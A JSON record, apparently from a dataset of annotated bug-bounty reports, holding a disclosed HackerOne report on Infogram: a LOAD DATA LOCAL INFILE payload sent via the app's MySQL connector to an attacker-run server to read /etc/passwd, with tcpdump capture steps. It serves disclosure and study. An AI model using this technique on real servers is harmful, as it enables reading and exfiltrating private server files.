@@ -1,0 +1,52 @@
+{
+    "reported_to": "Infogram",
+    "reported_by": "muon4 ",
+    "title": "LFI through the MySQL connection",
+    "content": "\nHello team!\nI've found a way to read Infogram's server local files through the MySQL connection.\nThe problem is that you're using the LOAD DATA LOCAL feature with your MySQL client. This how an attacker can easily send server's local files to her/his database.\nI've successfully readed the /etc/passwd and /etc/hosts files from your server.\nSteps to reproduce\nLogin\nMake a new infographic or navigate to the existing one\nNow add new MySQL connection under data section\nSet the value of the SQL SELECT statement to the following:\nCode 81 Bytes\n1LOAD DATA LOCAL INFILE '/etc/passwd'\n2INTO TABLE asd.asd\n3FIELDS TERMINATED BY \"\\n\"\nFill other necessary information (IP address, port etc..)\nNow setup/install the \"evil\" MySQL server with the database/table called asd and other needed information. Point your MySQL connection from infogram app to this server.\nListen network traffic of the \"evil\" MySQL server. If you are using tcpdump you can do wireshark readable file with this command tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap\nNow click Create in the infogram app\nOnce you get an error message at infogram app stop the tcpdump and open it with wireshark\n<image_0>\nDisable the LOAD DATA LOCAL feature if possible.\nIf you need any information please let me know.\nCheers!\nImpact\nReading local files from the server\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Information Disclosure"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kaAkxx9TLGFQyCLPMBicjwL4?response-content-disposition=attachment%3B%20filename%3D%22LoadLocalData.png%22%3B%20filename%2A%3DUTF-8%27%27LoadLocalData.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6H5VU6N2%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T023730Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGAKFOh1FHbJaZY1RxuAGSrHEXBRmkDCGZ1Mvr6vv70SAiBit3uFFRFC8N%2FDz6SxXhFvFOwfnXfsSN2AgvhauGjpEiqxBQggEAMaDDAxMzYxOTI3NDg0OSIMg4eaX2DrHVjEuzHnKo4FlkbM7r1JjiznnwEghk6FJE4NI7YBc9yN0RGL1JEFvfc9U7vG827%2Bt0Fs6Al7%2FMfHEj8nQnLqV2l7b7Q8yvmtNWB8k%2B6JkqNPEWbGMEPbiz3QsPYoK%2BYS8RKrlNxLeZZJq6OX%2F%2FtOFSDB80ql1RsXmZjhW34yzjjulFK4%2BjDWjAJqNT9zaFM%2Fe6fF44zAB98nVb40nYTfYRKwiqqBhM2FaFd21wbLSH%2B5890poLP4NptchbsdjlmAP%2BGQgDaBuFDluSIokXptHgLyhQEWYanM2KzJJR83d5YguVnvXtdreqyvJAxESU8pavqE16RUzmNNFv8Gpkjpo6eUXvKcUIE9KFs6ZhgTUETL6uZv%2FHUzaXyZr%2B0UDjIkATMZjE4PWb5mjQOB%2B%2FQE%2Fobhz3tCJutmvbToNQq2GKsruO2aUWdqMVSaTB0%2BXJklJ22D5Ja1IIelqFLADDbgoSio%2FvFJjm4pNeZd3cyQ8IZ5wqmmN1Dsa9bBYuHL3PU9bkB7p%2BuNIryUSXN9DSAKD5VqNyIAqR9DziM0RNWA2xeH%2BrYlSp8ea89rlib5U324Q%2BwPRIrkHavRPXZVIUyda4caupKS%2FacMMfLiW1pcuakVQak5tM7UrE1QIRAsGw%2FVgS%2FAu%2BD6OoRwBbW0YpbyIsS3k0XHi2cBP8vtavQn5Zb0EZcT4MFwff2O%2F99ei4Lr9W%2FTddXwORp%2BRIenIiwxanbGAxFBDQX1oG8IuVZ1sn8XEhIME82E6XqTy1Tbd32NdknhR5J1mfoj%2BW2ppPrg1nf2JCGKaMIj5AuH4jvC7L3uJ0DQoIeOhSaILFTRDN7H%2FxL%2BPP4M7EEWNucJLinunqF3n7WmuyJ%2BkdQF%2Bl3Jg%2FGmmZjRklXpMNzZjL8GOrIBS7JFCC2tMlRSokp%2F6xDb3MimfciEEcf7wK1jFXL%2FAK2kTaXdbntCllkoflZgs3z2Lje3NRdOPPv6AIo%2BwBrgik5bwXlJc4mm4YQlor3Hj5%2Fh8tFxmnjQ3GoWjpQjLd9P0yJ%2FWSL9qNG5Eo8tthQl%2B42EesTkWV1aKatrnJR07unu0BI7nAY2sRRdBACw5AX4TWjNv6YyggBduMV5M%2FeaY9WkSXnJt1EJEoC%2FhdvgsYBzYg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb6d7de9955da7573a80d731b9446f974ca3fd13dfd5612ac5cf438ef3c050e0"
+    },
+    "disclosed_date": 1573579980,
+    "report_url": "https://hackerone.com/reports/719875",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Login to the Infogram application and create a new infographic or navigate to an existing one."
+        ],
+        [
+            2,
+            "Add a new MySQL connection under the data section and set the SQL SELECT statement to 'LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY \"\\n\"'."
+        ],
+        [
+            3,
+            "Set up an 'evil' MySQL server with a database/table named 'asd' and configure the MySQL connection in Infogram to point to this server."
+        ],
+        [
+            4,
+            "Monitor the network traffic of the 'evil' MySQL server using tools like tcpdump or Wireshark."
+        ],
+        [
+            5,
+            "Click 'Create' in the Infogram application and observe the error message, then stop the network monitoring and analyze the captured traffic to view the contents of '/etc/passwd'."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to read local files from the server by exploiting the LOAD DATA LOCAL feature in MySQL. By setting up a malicious MySQL server and configuring the Infogram application to connect to it, the attacker can retrieve sensitive files like '/etc/passwd'.",
+    "reason": "The attack involves setting up a malicious MySQL server and configuring the application to connect to it, which requires knowledge of MySQL's LOAD DATA LOCAL feature and network monitoring. However, the steps are straightforward once the initial setup is understood.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
